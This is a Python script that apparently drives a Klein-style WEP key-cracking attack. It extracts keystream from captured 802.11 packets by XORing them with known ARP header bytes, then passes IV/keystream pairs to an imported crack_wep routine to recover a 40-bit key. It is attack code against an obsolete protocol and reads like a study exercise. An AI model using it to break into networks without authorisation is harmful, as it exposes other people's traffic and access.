from wep import klein_attack
from pcap.pcap import PCAP
from wlan.wlan import IEEE802_11
from wep_parser.wep import WEP
import datetime
from utils import log
import pickle

def parse_pcap( filename ):
	mypcap = PCAP(filename)
	pcaph = mypcap.header()
	known_headers = bytearray([ 0xAA, 0xAA, 0x03, 0x00, 0x00, 0x00, 0x08, 0x06, 0x00, 0x01, 0x08, 0x00, 0x06, 0x04, 0x00, 0x01])

	#print("Verison: " + `pcaph['major']` + "." + `pcaph['minor']`)
	#print("Type: " + pcaph['captypestring'] + "(" + `pcaph['captype']` + ") MaxLen: " + `pcaph['maxlen']`)
	#print("Number of Packets: " + `sum(1 for _ in mypcap)`)

	iv_stream_pair = []
	for packet in mypcap:
		if packet['len'] == 68:
			iv, k, ciphertext, icv = WEP( IEEE802_11(packet['data']).get_payload() ).get()
			stream_key = bytearray([ a ^ b for (a,b) in zip(ciphertext, known_headers) ])
#			print(' '.join(format(x, '#010b') for x in ciphertext[:12]))
#			print(' '.join(format(x, '#010b') for x in known_headers[:12]))
#			print(' '.join(format(x, '#010b') for x in stream_key[:12]))
#			print("----------------------------------------------------------")
			iv_stream_pair.append(dict(iv=iv, stream_key=stream_key))

	return iv_stream_pair

key_length = 40
n = 256

start = datetime.datetime.now()
key_length_bytes = int(key_length / 8)

# Retrieve sample set of bytearray tuples
log("Collection Key Stream ... ", level=0)
from pathlib import Path

iv_stream_pair = []
iv_stream_pair = iv_stream_pair + parse_pcap("output-05.cap")
iv_stream_pair = iv_stream_pair + parse_pcap("output-03.cap")

#try to remove duplicate ivs
if False:
	uniques = set()
	i=0
	unique_iv_stream_pair = []
	for iv in iv_stream_pair:
		tmpiv=iv.get('iv')
		setlen=len(uniques)
		uniques.add(str(tmpiv))
		if setlen == len(uniques):
			unique_iv_stream_pair.append(iv)
		i+=1
		print('\r{}'.format(i), end="", flush=True)
	print(" packages contained {} unique pairs".format(len(unique_iv_stream_pair)))

	tuple_amount = len(unique_iv_stream_pair)
	iv_stream_pair = unique_iv_stream_pair
else:
	tuple_amount = len(iv_stream_pair)

log("Key Stream collected after {}ms".format(int((datetime.datetime.now() - start).total_seconds() * 1000)),
    level=0)

# Crack wep by approximating main key bytes from (iv, stream cipher) pairs
log("Start Hacking {} ms".format(int((datetime.datetime.now() - start).total_seconds() * 1000)), level=0)
possible_key = klein_attack.crack_wep(iv_stream_pair, key_length_bytes, n, tuple_amount)

ms_end = int((datetime.datetime.now() - start).total_seconds() * 1000)
s_end = int((datetime.datetime.now() - start).total_seconds())
log("Key found after {}ms ({} seconds)".format(ms_end, s_end), level=0)
print(' '.join(format(x, '02x') for x in possible_key))
